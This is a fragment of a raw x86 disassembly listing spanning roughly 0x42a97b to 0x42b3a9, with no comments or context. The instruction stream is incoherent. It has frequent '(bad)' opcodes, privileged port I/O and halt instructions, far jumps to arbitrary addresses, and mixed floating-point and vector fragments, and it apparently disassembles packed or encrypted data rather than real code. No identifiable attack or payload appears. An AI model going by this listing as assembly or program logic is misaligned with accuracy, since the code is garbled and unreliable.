  42a97b:	mov    al,ds:0x58a3c496
  42a980:	hlt    
  42a981:	nop
  42a982:	pop    ds
  42a983:	mov    ds:0x7ec3b04d,al
  42a988:	jmp    0x42a9d4
  42a98a:	mov    esp,0x1ac90119
  42a98f:	jae    0x42a9cc
  42a991:	push   ebx
  42a992:	sub    al,0x1d
  42a994:	loop   0x42a9a3
  42a996:	and    BYTE PTR [edx+edi*1-0x730567ae],dh
  42a99d:	jp     0x42a9d4
  42a99f:	pop    esi
  42a9a0:	and    al,BYTE PTR [ebp+ebp*4+0x7c]
  42a9a4:	out    dx,eax
  42a9a5:	cmp    BYTE PTR [eax-0x3eb13fc2],dh
  42a9ab:	inc    esi
  42a9ac:	cli    
  42a9ad:	leave  
  42a9ae:	adc    DWORD PTR [edx+edx*1],esp
  42a9b1:	into   
  42a9b2:	icebp  
  42a9b3:	sbb    BYTE PTR [ebp+0x2a8f4610],0x4e
  42a9ba:	mul    BYTE PTR [ecx-0x417594d9]
  42a9c0:	jle    0x42aa17
  42a9c2:	out    dx,eax
  42a9c3:	push   ss
  42a9c4:	add    DWORD PTR ds:0x66b816,edx
  42a9ca:	out    0x80,al
  42a9cc:	sub    eax,0xaa001e0b
  42a9d1:	lds    edx,FWORD PTR [eax-0x25df5cef]
  42a9d7:	push   ss
  42a9d8:	adc    BYTE PTR [edx+0x2d1dbb0a],0x68
  42a9df:	repz mov edi,0x95cdedfb
  42a9e5:	mov    ds:0x2848a690,eax
  42a9ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a9eb:	dec    edx
  42a9ec:	enter  0x0,0x0
	...
  42aa54:	add    BYTE PTR [eax],al
  42aa56:	test   al,0x93
  42aa58:	sbb    eax,0xfbee3fee
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	out    0xc,al
  42aa64:	out    dx,eax
  42aa65:	jo     0x42aadc
  42aa67:	enter  0x1,0xff
  42aa6b:	add    BYTE PTR [eax],al
  42aa6d:	add    dl,al
  42aa6f:	sbb    cl,bh
  42aa71:	xor    bl,BYTE PTR [eax+0x2f31a959]
  42aa77:	mov    cl,0xae
  42aa79:	push   ebp
  42aa7a:	repz repnz inc ecx
  42aa7d:	jle    0x42aa5a
  42aa7f:	push   cs
  42aa80:	pop    eax
  42aa81:	(bad)  
  42aa82:	rcr    DWORD PTR [ecx-0x29],cl
  42aa85:	scas   al,BYTE PTR es:[edi]
  42aa86:	fstp   st(0)
  42aa88:	fs push es
  42aa8a:	cmp    DWORD PTR [edx],0xffffff9e
  42aa8d:	xor    BYTE PTR [ecx+0x48],cl
  42aa90:	fcmovbe st,st(6)
  42aa92:	lds    ebp,FWORD PTR [edx-0x650d9d9b]
  42aa98:	into   
  42aa99:	cli    
  42aa9a:	std    
  42aa9b:	stos   BYTE PTR es:[edi],al
  42aa9c:	inc    ecx
  42aa9d:	imul   edx,DWORD PTR [ebx-0x355fe88d],0x39
  42aaa4:	sub    BYTE PTR [esi+0x60],dl
  42aaa7:	inc    edi
  42aaa8:	xor    DWORD PTR [ebp-0x51842f60],edx
  42aaae:	fistp  DWORD PTR [ecx+0x7e]
  42aab1:	mov    esp,0x8c3a1d48
  42aab6:	cmp    ebx,esp
  42aab8:	test   eax,0xab267390
  42aabd:	fsubr  DWORD PTR [edi+edi*2]
  42aac0:	adc    BYTE PTR [edx-0x18],al
  42aac3:	dec    ebx
  42aac4:	ss jge 0x42aab3
  42aac7:	loop   0x42aaaa
  42aac9:	add    al,BYTE PTR [edi+0x76eb57dc]
  42aacf:	pop    es
  42aad0:	inc    esi
  42aad1:	mov    eax,ds:0x7f0290f0
  42aad6:	sub    al,0x14
  42aad8:	out    dx,eax
  42aad9:	adc    ah,BYTE PTR [ebx]
  42aadb:	pushw  ss
  42aadd:	arpl   bp,cx
  42aadf:	mov    WORD PTR [ebp+eax*8+0x70],cs
  42aae3:	mov    WORD PTR [edx-0x13f6e89],?
  42aae9:	and    DWORD PTR [edx-0x77ee04bf],esp
  42aaef:	jbe    0x42aac3
  42aaf1:	sbb    ebx,DWORD PTR [esi+ebx*8]
  42aaf4:	xchg   ebx,eax
  42aaf5:	cmc    
  42aaf6:	push   esi
  42aaf7:	xor    DWORD PTR [ecx],edx
  42aaf9:	aad    0xfe
  42aafb:	inc    ebp
  42aafc:	xchg   esp,eax
  42aafd:	pop    ebp
  42aafe:	scas   eax,DWORD PTR es:[edi]
  42aaff:	pop    ds
  42ab00:	sub    ecx,DWORD PTR [eax+0x2ce6654a]
  42ab06:	lods   al,BYTE PTR ds:[esi]
  42ab07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab08:	test   BYTE PTR [esi+0x16],bh
  42ab0b:	leave  
  42ab0c:	(bad)  
  42ab0d:	xchg   edx,eax
  42ab0e:	adc    cl,ch
  42ab10:	xchg   esp,eax
  42ab11:	xor    eax,0xddcf795b
  42ab16:	test   BYTE PTR [edi-0x36],bl
  42ab19:	jno    0x42aaf5
  42ab1b:	mov    dl,0x50
  42ab1d:	push   ds
  42ab1e:	stos   BYTE PTR es:[edi],al
  42ab1f:	mov    ebp,0xa7d45af1
  42ab24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab25:	ins    BYTE PTR es:[edi],dx
  42ab26:	mov    edi,0xca94707b
  42ab2b:	pop    esi
  42ab2c:	or     BYTE PTR [edi+0x77],ch
  42ab2f:	lods   eax,DWORD PTR ds:[esi]
  42ab30:	xlat   BYTE PTR ds:[ebx]
  42ab31:	mov    ebp,0xa724ed8a
  42ab36:	push   esi
  42ab37:	cmp    al,0xa8
  42ab39:	sub    al,BYTE PTR [ebp+0x38]
  42ab3c:	fst    DWORD PTR [edx-0x51ab6c5]
  42ab42:	ret    
  42ab43:	sub    ch,dl
  42ab45:	cmp    DWORD PTR [esi-0xf35c09c],edi
  42ab4b:	or     eax,0x1ecd2c92
  42ab50:	jmp    0x42aba0
  42ab52:	mov    WORD PTR [eax+edx*1-0x5f0b3c11],fs
  42ab59:	adc    dh,BYTE PTR [eax+edx*8-0x3d]
  42ab5d:	ins    DWORD PTR es:[edi],dx
  42ab5e:	out    dx,eax
  42ab5f:	adc    ecx,0xbf04cad2
  42ab65:	pop    edx
  42ab66:	cld    
  42ab67:	sbb    DWORD PTR [edx-0x1e],edx
  42ab6a:	fimul  DWORD PTR [edx+0x7f]
	...
  42abd4:	add    BYTE PTR [eax],al
  42abd6:	ds push cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	mov    ebp,0x740ddf87
  42abe7:	leave  
  42abe8:	add    DWORD PTR [eax],eax
  42abea:	inc    DWORD PTR [eax]
  42abec:	add    BYTE PTR [eax],al
  42abee:	fild   DWORD PTR [ecx]
  42abf0:	sbb    eax,ebx
  42abf2:	dec    edx
  42abf3:	ja     0x42abaa
  42abf5:	(bad)  
  42abf6:	(bad)  
  42abf7:	mov    al,0x23
  42abf9:	in     al,dx
  42abfa:	pusha  
  42abfb:	jno    0x42ab8b
  42abfd:	inc    edx
  42abfe:	loopne 0x42ac04
  42ac00:	add    dh,BYTE PTR [ebp+0x2f9fccd9]
  42ac06:	gs add edx,edi
  42ac09:	sbb    bl,BYTE PTR [esi]
  42ac0b:	dec    edi
  42ac0c:	jl     0x42aba6
  42ac0e:	xchg   ecx,eax
  42ac0f:	cli    
  42ac10:	aam    0x18
  42ac12:	push   eax
  42ac13:	out    0x7f,eax
  42ac15:	fadd   QWORD PTR [eax]
  42ac17:	mov    cl,BYTE PTR [edx-0x340e57bf]
  42ac1d:	ror    DWORD PTR [edi+ebp*1+0x41f2d1c1],0x6b
  42ac25:	stos   BYTE PTR es:[edi],al
  42ac26:	(bad)  
  42ac27:	retf   0x2763
  42ac2a:	in     al,dx
  42ac2b:	adc    edi,DWORD PTR [ecx]
  42ac2d:	mov    edi,0x4d697855
  42ac32:	jb     0x42abc8
  42ac34:	addr16 leave 
  42ac36:	cmp    al,0x67
  42ac38:	jnp    0x42ac5d
  42ac3a:	div    BYTE PTR [eax]
  42ac3c:	pop    ds
  42ac3d:	std    
  42ac3e:	pop    eax
  42ac3f:	dec    ebx
  42ac40:	and    eax,0xccf10125
  42ac45:	inc    ebp
  42ac46:	ins    BYTE PTR es:[edi],dx
  42ac47:	hlt    
  42ac48:	push   DWORD PTR [edi-0x731cab18]
  42ac4e:	and    esi,esi
  42ac50:	sbb    eax,0xb97d87fe
  42ac55:	mov    bh,0x9f
  42ac57:	and    ebx,esp
  42ac59:	(bad)
  42ac5c:	or     eax,0x8360188
  42ac61:	(bad)  
  42ac62:	lods   eax,DWORD PTR ss:[esi]
  42ac64:	shr    BYTE PTR [ebx],0xc
  42ac67:	pop    ds
  42ac68:	sub    DWORD PTR [edx+0x42c83069],eax
  42ac6e:	jb     0x42acd0
  42ac70:	in     al,dx
  42ac71:	sbb    BYTE PTR [edx-0x64],bh
  42ac74:	sbb    edi,DWORD PTR ds:0xaddf79f5
  42ac7a:	addr16 iret 
  42ac7c:	rol    DWORD PTR [esi],cl
  42ac7e:	mov    cl,0x95
  42ac80:	pop    ebp
  42ac81:	adc    DWORD PTR [ecx+0x3f],0x67ecd188
  42ac88:	adc    ecx,DWORD PTR [edx]
  42ac8a:	rol    BYTE PTR [esi],cl
  42ac8c:	imul   ebp,edx,0x2c
  42ac8f:	inc    bp
  42ac91:	nop
  42ac92:	cmp    eax,0xcdc06c8c
  42ac97:	and    DWORD PTR [edx],0x6282f24
  42ac9d:	sbb    DWORD PTR [edx-0x21],eax
  42aca0:	add    ebx,esi
  42aca2:	mov    dh,0xb4
  42aca4:	js     0x42ac29
  42aca6:	or     ebx,DWORD PTR [ecx-0x1c]
  42aca9:	and    bh,BYTE PTR [ecx]
  42acab:	into   
  42acac:	mov    esi,ebp
  42acae:	fwait
  42acaf:	pop    ds
  42acb0:	jmp    FWORD PTR [ebp+0x45a4623d]
  42acb6:	inc    edi
  42acb7:	call   0xf2b03019
  42acbc:	repnz cwde 
  42acbe:	xchg   bl,ah
  42acc0:	or     ecx,DWORD PTR [ebp+0x37]
  42acc3:	pusha  
  42acc4:	mov    al,0x43
  42acc6:	test   al,0x54
  42acc8:	jo     0x42acba
  42acca:	jo     0x42aca9
  42accc:	mov    ebp,DWORD PTR [ecx+ebx*1]
  42accf:	xchg   esi,eax
  42acd0:	and    ecx,DWORD PTR [edx+0x1b]
  42acd3:	cmp    eax,DWORD PTR [ebx+0x5209ade1]
  42acd9:	xchg   esp,eax
  42acda:	push   esp
  42acdb:	jo     0x42acb5
  42acdd:	sub    DWORD PTR [edx-0x202aad57],edx
  42ace3:	loopne 0x42ace7
  42ace5:	mov    ah,ch
  42ace7:	(bad)  
  42ace8:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42acea:	dec    ebp
  42aceb:	test   esi,esi
	...
  42ad55:	add    cl,ch
  42ad57:	xor    bl,BYTE PTR [edx+edi*1]
  42ad5a:	fistp  QWORD PTR [esi]
  42ad5c:	out    dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	and    al,0x17
  42ad64:	xor    ch,dh
  42ad66:	jae    0x42ad32
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	inc    DWORD PTR [eax]
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	pop    ss
  42ad6f:	mov    WORD PTR ds:0x29aed493,?
  42ad75:	pop    ds
  42ad76:	dec    ebx
  42ad77:	enter  0xfbe9,0x4
  42ad7b:	push   ebx
  42ad7c:	fsub   QWORD PTR [edx]
  42ad7e:	or     eax,0x9c0360ee
  42ad83:	pop    edx
  42ad84:	xor    edi,DWORD PTR [esi-0x43e37fcc]
  42ad8a:	mov    edx,0x51b0fcd2
  42ad8f:	or     al,0x75
  42ad91:	push   esp
  42ad92:	inc    edi
  42ad93:	out    dx,eax
  42ad94:	call   0xb99e:0xeef1789
  42ad9b:	xor    DWORD PTR [ebp-0x16673311],ecx
  42ada1:	loope  0x42ae0d
  42ada3:	loop   0x42ad49
  42ada5:	sbb    esp,esp
  42ada7:	shr    BYTE PTR [edx+edi*1+0x6],cl
  42adab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42adac:	sub    ebx,esp
  42adae:	xchg   esi,eax
  42adaf:	add    DWORD PTR [eax],ecx
  42adb1:	dec    edx
  42adb2:	xor    al,0xcb
  42adb4:	mov    WORD PTR [ecx+eiz*1+0x50ca7427],ds
  42adbb:	sbb    dh,BYTE PTR [ebp-0x6b598fc0]
  42adc1:	xchg   BYTE PTR [edi],bh
  42adc3:	not    al
  42adc5:	mov    BYTE PTR ds:[ecx-0x3e9d86ca],al
  42adcc:	into   
  42adcd:	ror    DWORD PTR [esi+0x4cba28c],0x40
  42add4:	mov    ch,0xb4
  42add6:	xor    ebp,esp
  42add8:	je     0x42adf3
  42adda:	mov    ds:0x784f3bec,al
  42addf:	xor    esp,DWORD PTR [eiz*2+0x56504ad5]
  42ade6:	inc    ebp
  42ade7:	sub    BYTE PTR ds:0xc06b1f9,0x4c
  42adee:	and    esi,DWORD PTR [esi]
  42adf0:	ficomp WORD PTR [ebx]
  42adf2:	adc    BYTE PTR [ebx],dl
  42adf4:	int    0xbc
  42adf6:	jecxz  0x42ae17
  42adf8:	sti    
  42adf9:	mov    cl,0xaa
  42adfc:	stos   DWORD PTR es:[edi],eax
  42adfd:	sbb    DWORD PTR [edi],ecx
  42adff:	test   eax,0x19250030
  42ae04:	rol    al,1
  42ae06:	mov    esi,0x520ac693
  42ae0b:	(bad)  [eax+0x5f]
  42ae0e:	out    dx,eax
  42ae0f:	mov    ch,0x64
  42ae11:	dec    ebp
  42ae12:	adc    BYTE PTR [ecx],al
  42ae14:	lods   eax,DWORD PTR ds:[esi]
  42ae15:	stos   BYTE PTR es:[edi],al
  42ae16:	ret    
  42ae17:	and    ecx,esp
  42ae19:	popa   
  42ae1a:	fndisi(8087 only) 
  42ae1c:	aaa    
  42ae1d:	inc    ebx
  42ae1e:	sbb    al,0x9a
  42ae20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae21:	xchg   ebp,eax
  42ae22:	fcom   DWORD PTR [edx-0x3c]
  42ae25:	xchg   ebx,eax
  42ae26:	inc    edx
  42ae27:	dec    esi
  42ae28:	adc    al,0xec
  42ae2a:	adc    ch,cl
  42ae2c:	xor    BYTE PTR [edx+0x92eefb0],ah
  42ae32:	xlat   BYTE PTR ds:[ebx]
  42ae33:	mov    bh,0xaa
  42ae35:	in     al,dx
  42ae36:	mov    esi,0xde10fa60
  42ae3b:	and    eax,DWORD PTR [esp+eiz*4+0x5e470279]
  42ae42:	inc    ebx
  42ae43:	(bad)  
  42ae44:	push   edx
  42ae45:	mov    esp,0x853d87
  42ae4a:	popa   
  42ae4b:	cmp    ch,BYTE PTR [edx-0x7bf881f3]
  42ae51:	push   edx
  42ae52:	ss adc ebp,ebp
  42ae55:	out    0xd9,eax
  42ae57:	popa   
  42ae58:	xor    ah,BYTE PTR [ecx-0x63]
  42ae5b:	(bad)  
  42ae5d:	loopne 0x42ae5f
  42ae5f:	cmc    
  42ae60:	stc    
  42ae61:	mov    bh,0xdf
  42ae63:	ins    BYTE PTR es:[edi],dx
  42ae64:	or     BYTE PTR [esi+0x5e870cce],dh
  42ae6a:	mov    esp,0x819c
	...
  42aed3:	add    BYTE PTR [eax],al
  42aed5:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	je     0x42af37
  42aee4:	adc    DWORD PTR fs:[edx-0x35],esi
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	inc    DWORD PTR [eax]
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aeef:	rol    BYTE PTR [edi+esi*2],cl
  42aef2:	add    eax,0x9e8b5029
  42aef7:	push   ebx
  42aef8:	sti    
  42aef9:	push   ebp
  42aefa:	adc    al,0x93
  42aefc:	xchg   esp,eax
  42aefd:	dec    eax
  42aefe:	test   al,0xd2
  42af00:	cmp    dl,0x13
  42af03:	das    
  42af04:	js     0x42af03
  42af06:	mov    ds:0x65e000a1,al
  42af0b:	imul   esp,edi,0xffffffe3
  42af0e:	mov    eax,0x4a7f4a71
  42af13:	fiadd  WORD PTR ds:0x56656680
  42af19:	cmp    al,0xfe
  42af1b:	push   ds
  42af1c:	mov    eax,ds:0x8fba4b84
  42af21:	push   0xffffff99
  42af23:	sbb    DWORD PTR [edx-0x48147d6],0x71
  42af2a:	retf   
  42af2b:	lock cmp eax,0x3c26cbd6
  42af31:	mov    al,dl
  42af33:	jns    0x42af5c
  42af35:	sahf   
  42af36:	cmp    al,BYTE PTR [ebp-0x53]
  42af39:	into   
  42af3a:	push   ds
  42af3b:	repz mov dl,0xc1
  42af3e:	mov    dl,0x16
  42af40:	add    DWORD PTR [ecx],ebx
  42af42:	and    edi,DWORD PTR [edi+0x16]
  42af45:	fs jecxz 0x42afa0
  42af48:	aam    0x8d
  42af4a:	fstp   QWORD PTR cs:[edi-0x76]
  42af4e:	cwde   
  42af4f:	fiadd  WORD PTR [edx-0x2a]
  42af52:	outs   dx,BYTE PTR ds:[esi]
  42af53:	and    al,0x7d
  42af55:	xor    BYTE PTR [edx-0x15],bh
  42af58:	add    BYTE PTR [esi],al
  42af5a:	repnz ss sbb al,0x6c
  42af5e:	outs   dx,DWORD PTR ds:[esi]
  42af5f:	inc    ebp
  42af60:	push   edi
  42af61:	cmp    ebx,DWORD PTR [ecx+0x7b]
  42af64:	in     eax,0x38
  42af66:	fdiv   QWORD PTR [ecx-0xb0a47ab]
  42af6c:	mov    ebp,0x418f579c
  42af71:	inc    edi
  42af72:	(bad)  
  42af73:	lea    edi,[ebp+0x4b44a930]
  42af79:	dec    ebp
  42af7a:	lea    ecx,[ebp+0xe3c9512]
  42af80:	lea    esi,[ebx]
  42af82:	add    BYTE PTR [edx],cl
  42af84:	pop    ecx
  42af85:	imul   edx,ebx,0x33
  42af88:	sub    ebp,esi
  42af8a:	std    
  42af8b:	sbb    BYTE PTR [ebx-0x7d77e507],0x9a
  42af92:	and    al,0x5a
  42af94:	add    BYTE PTR [edx+0x2f44cf4],bl
  42af9a:	mov    eax,0xb6bd9ac7
  42af9f:	test   BYTE PTR [esi+0x55d95f9d],0x9a
  42afa6:	cmp    eax,DWORD PTR [ecx+0x1e0be1b5]
  42afac:	sub    ah,BYTE PTR [eax-0x170f4623]
  42afb2:	jne    0x42afa0
  42afb4:	mov    ecx,gs
  42afb6:	pop    edi
  42afb7:	dec    ebp
  42afb8:	call   0xe64bdb57
  42afbd:	or     ah,0x40
  42afc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42afc1:	pop    edi
  42afc2:	in     eax,dx
  42afc3:	jnp    0x42af47
  42afc5:	push   es
  42afc6:	push   ecx
  42afc7:	add    bl,dh
  42afc9:	push   ss
  42afca:	sub    DWORD PTR [edi+0x36],ebp
  42afcd:	fldcw  WORD PTR [ebx]
  42afcf:	jne    0x42b00d
  42afd1:	inc    edi
  42afd2:	push   es
  42afd3:	or     dh,BYTE PTR [edx+ebp*4]
  42afd6:	inc    esp
  42afd7:	add    eax,0x921e7ee3
  42afdc:	ret    0x224e
  42afdf:	inc    ebx
  42afe0:	mov    esp,0xd743522a
  42afe5:	shl    BYTE PTR [ecx+0x5],0x84
  42afe9:	arpl   sp,ax
  42afeb:	hlt    
  42afec:	mov    esp,0x0
	...
  42b055:	add    cl,bh
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	mov    ds:0x7162be96,al
  42b067:	int3   
  42b068:	add    DWORD PTR [eax],eax
  42b06a:	inc    DWORD PTR [eax]
  42b06c:	add    BYTE PTR [eax],al
  42b06e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b06f:	xchg   ebp,eax
  42b070:	mov    ch,BYTE PTR [eax+0x5a]
  42b073:	push   eax
  42b074:	or     ecx,edi
  42b076:	(bad)  [ecx+0x36]
  42b079:	sub    BYTE PTR [esi],0x6c
  42b07c:	test   BYTE PTR [ebx-0x6d9d07f4],dl
  42b082:	clc    
  42b083:	test   al,0x35
  42b085:	and    ah,BYTE PTR [edi+0x75]
  42b088:	jae    0x42b056
  42b08a:	(bad)  
  42b08b:	loop   0x42b04d
  42b08d:	jmp    0x44ab:0x1eaaeab1
  42b094:	adc    esp,esi
  42b096:	xlat   BYTE PTR ds:[ebx]
  42b097:	lods   eax,DWORD PTR ds:[esi]
  42b098:	cdq    
  42b099:	or     eax,0x4f688519
  42b09e:	jmp    0x290e1251
  42b0a3:	cmp    ecx,0x6af657d8
  42b0a9:	test   dh,al
  42b0ab:	pop    ds
  42b0ac:	jecxz  0x42b034
  42b0ae:	push   ebp
  42b0af:	push   0x98be1b09
  42b0b4:	mov    edi,0x3916c7d7
  42b0b9:	stos   BYTE PTR es:[edi],al
  42b0ba:	div    BYTE PTR [ebp-0x4fbb7c64]
  42b0c0:	call   FWORD PTR [eax-0x738f7c6e]
  42b0c6:	les    ebx,FWORD PTR [edi+0x38]
  42b0c9:	pop    ss
  42b0ca:	jae    0x42b0d3
  42b0cc:	sub    al,0x7a
  42b0ce:	sub    cl,BYTE PTR ds:0x4db1417b
  42b0d4:	mov    gs,WORD PTR [edi+0xfe0d468]
  42b0da:	bound  esi,QWORD PTR [ebx+0x10491426]
  42b0e0:	pop    eax
  42b0e1:	sti    
  42b0e2:	xchg   edi,eax
  42b0e3:	xor    ebx,DWORD PTR ds:0xf555794a
  42b0e9:	inc    esi
  42b0ea:	mov    ch,0xcf
  42b0ec:	ins    DWORD PTR es:[edi],dx
  42b0ed:	jae    0x42b12d
  42b0ef:	xor    dh,dl
  42b0f1:	jmp    0x95d186f9
  42b0f6:	in     al,dx
  42b0f7:	push   edi
  42b0f8:	jnp    0x42b0d5
  42b0fa:	test   al,0x95
  42b0fc:	hlt    
  42b0fd:	fcom   QWORD PTR [edx]
  42b0ff:	cmp    eax,DWORD PTR [ebx-0x5b]
  42b102:	inc    DWORD PTR [edi+ebx*2]
  42b105:	pushf  
  42b106:	imul   ecx,DWORD PTR [esi],0x85dc29c1
  42b10c:	add    esp,edi
  42b10e:	call   0xee511e9f
  42b113:	rol    BYTE PTR [esi-0x24b59393],0x88
  42b11a:	mov    dh,0x5c
  42b11c:	sbb    eax,0xbcae1a67
  42b121:	ds mov bl,0x62
  42b124:	inc    esi
  42b125:	jmp    0xaa10:0x56893364
  42b12c:	xor    eax,0x97d53ae6
  42b131:	mov    ebx,0xab02bcfb
  42b136:	aaa    
  42b137:	inc    edx
  42b138:	jmp    0x1261f0ef
  42b13d:	popa   
  42b13e:	mov    ebp,0xd589384b
  42b143:	loopne 0x42b152
  42b145:	pop    es
  42b146:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b148:	test   BYTE PTR [esi-0x55],bl
  42b14b:	popf   
  42b14c:	or     eax,ebp
  42b14e:	and    BYTE PTR [ecx-0x34edc687],bl
  42b154:	sbb    al,0xf1
  42b156:	dec    ebx
  42b157:	cmc    
  42b158:	jge    0x42b147
  42b15a:	dec    edx
  42b15b:	and    bl,BYTE PTR [ebx]
  42b15d:	loop   0x42b1ad
  42b15f:	mov    ebx,0xd09d459f
  42b164:	arpl   cx,sp
  42b166:	push   ebx
  42b167:	test   al,0x14
  42b169:	adc    al,0xc4
  42b16b:	and    edx,ecx
	...
  42b1d5:	add    BYTE PTR [ebp+0x25],dh
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	mov    edx,0x70a29181
  42b1e7:	int    0x1
  42b1e9:	add    bh,bh
  42b1eb:	add    BYTE PTR [eax],al
  42b1ed:	add    BYTE PTR [eax+0x63],dl
  42b1f0:	data16 sahf 
  42b1f2:	lea    edx,[ecx-0x65]
  42b1f5:	pop    ss
  42b1f6:	inc    ebx
  42b1f7:	pop    edi
  42b1f8:	push   ss
  42b1f9:	int    0x28
  42b1fb:	les    ebp,FWORD PTR [edi+0xd]
  42b1fe:	jl     0x42b1ee
  42b200:	sbb    al,0x47
  42b202:	jge    0x42b24d
  42b204:	xor    DWORD PTR [ebp+0x35],ebx
  42b207:	inc    eax
  42b208:	ja     0x42b1a4
  42b20a:	xchg   ebp,eax
  42b20b:	ins    DWORD PTR es:[edi],dx
  42b20c:	call   0x7771:0x927b45db
  42b213:	add    eax,0x7899cb81
  42b218:	push   esp
  42b219:	out    0x28,eax
  42b21b:	into   
  42b21c:	cdq    
  42b21d:	cwde   
  42b21e:	mov    ah,0x98
  42b220:	test   eax,0xd1fcc001
  42b225:	test   BYTE PTR [ebx+0x5f],bl
  42b228:	dec    ebx
  42b229:	out    dx,al
  42b22a:	scas   al,BYTE PTR es:[edi]
  42b22b:	sti    
  42b22c:	cmp    DWORD PTR [esi+0x6f],edx
  42b22f:	pop    ecx
  42b230:	mov    ds:0x9042a50,al
  42b235:	cld    
  42b236:	jae    0x42b2ac
  42b238:	and    edi,DWORD PTR [edx+0x38e3920]
  42b23e:	push   0xf3bab773
  42b243:	aam    0xff
  42b245:	add    al,dl
  42b247:	push   es
  42b248:	mov    al,ds:0xe00b97ae
  42b24d:	rcr    DWORD PTR [edi-0x60724f71],cl
  42b253:	fild   WORD PTR [esi+0x70a836]
  42b259:	outs   dx,BYTE PTR ds:[esi]
  42b25a:	mov    ch,0xaa
  42b25c:	fistp  QWORD PTR [ebp-0x23e488c2]
  42b262:	add    al,0xf9
  42b264:	ror    BYTE PTR [edx],cl
  42b266:	cmp    ebx,DWORD PTR [ebp+0xa690947]
  42b26c:	jmp    0x2712:0x9eab4159
  42b273:	and    ecx,DWORD PTR [edx+ebx*1]
  42b276:	(bad)  
  42b277:	sub    al,0x8c
  42b279:	and    dh,BYTE PTR [eax+0x74]
  42b27c:	mov    bl,0xf8
  42b27e:	xchg   edx,eax
  42b27f:	xor    ebp,eax
  42b281:	adc    dh,BYTE PTR [ecx]
  42b283:	inc    esi
  42b284:	xchg   ebx,eax
  42b285:	call   0x64b3969f
  42b28a:	cmp    al,BYTE PTR [eax]
  42b28c:	(bad)  
  42b28d:	repz push es
  42b28f:	and    eax,0xfeb9f78f
  42b294:	(bad)  
  42b295:	ja     0x42b315
  42b297:	sub    BYTE PTR [edx],ch
  42b299:	and    dl,BYTE PTR [ebx-0x2530b992]
  42b29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2a0:	ds push esi
  42b2a2:	stc    
  42b2a3:	test   DWORD PTR [eax+0x63],ebp
  42b2a6:	or     eax,0x60b61e9f
  42b2ab:	push   es
  42b2ac:	push   cs
  42b2ad:	jnp    0x42b25c
  42b2af:	test   eax,0xffc1ec68
  42b2b4:	dec    ecx
  42b2b5:	gs (bad) 
  42b2b7:	and    DWORD PTR [edx+eiz*1],esp
  42b2ba:	ins    BYTE PTR es:[edi],dx
  42b2bb:	pop    esi
  42b2bc:	ss jnp 0x42b2b7
  42b2bf:	out    dx,eax
  42b2c0:	xchg   esi,eax
  42b2c1:	pop    edi
  42b2c2:	les    esi,FWORD PTR [ebp-0x4e]
  42b2c5:	push   0x38
  42b2c7:	mov    eax,ds:0x84c74ca2
  42b2cc:	mov    esp,0xabec0b75
  42b2d1:	je     0x42b2b1
  42b2d3:	sbb    DWORD PTR [ebp-0x1ba961d2],ecx
  42b2d9:	xchg   ebx,eax
  42b2da:	push   cs
  42b2db:	outs   dx,BYTE PTR ds:[esi]
  42b2dc:	outs   dx,BYTE PTR ds:[esi]
  42b2dd:	push   ebx
  42b2de:	sub    ebp,DWORD PTR [edi]
  42b2e0:	fcom   DWORD PTR [edx+0x66963844]
  42b2e6:	mov    edx,0x97578050
  42b2eb:	sbb    dl,BYTE PTR [ecx+0x0]
	...
  42b355:	add    BYTE PTR [ebp-0x449f6672],ah
  42b35b:	ja     0x42b35a
  42b35d:	iret   
  42b35e:	sub    eax,0x18738e65
  42b363:	and    DWORD PTR [edi],ebx
  42b365:	outs   dx,DWORD PTR gs:[esi]
  42b367:	into   
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	inc    DWORD PTR [eax]
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	xlat   BYTE PTR ds:[ebx]
  42b36f:	test   DWORD PTR [edx+edx*1],0xb18512ff
  42b376:	xor    al,0x4
  42b378:	mov    ah,0xb3
  42b37a:	xor    edx,edi
  42b37c:	cmp    eax,0x284a4d36
  42b381:	jbe    0x42b35a
  42b383:	xchg   edi,eax
  42b384:	inc    eax
  42b385:	and    BYTE PTR [ebx],dh
  42b387:	ds dec ebx
  42b389:	jl     0x42b37e
  42b38b:	and    eax,0x65c97ab5
  42b390:	cwde   
  42b391:	jg     0x42b31e
  42b393:	pushf  
  42b394:	(bad)  {k7}{z}
  42b399:	pop    ebp
  42b39a:	mov    esp,esp
  42b39c:	in     al,dx
  42b39d:	add    bh,BYTE PTR [edx+0x10]
  42b3a0:	dec    edx
  42b3a1:	clc    
  42b3a2:	lods   eax,DWORD PTR ds:[esi]
  42b3a3:	rcr    BYTE PTR [edi+0x6b7d6fb4],1
  42b3a9:	add    eax,0x10964364
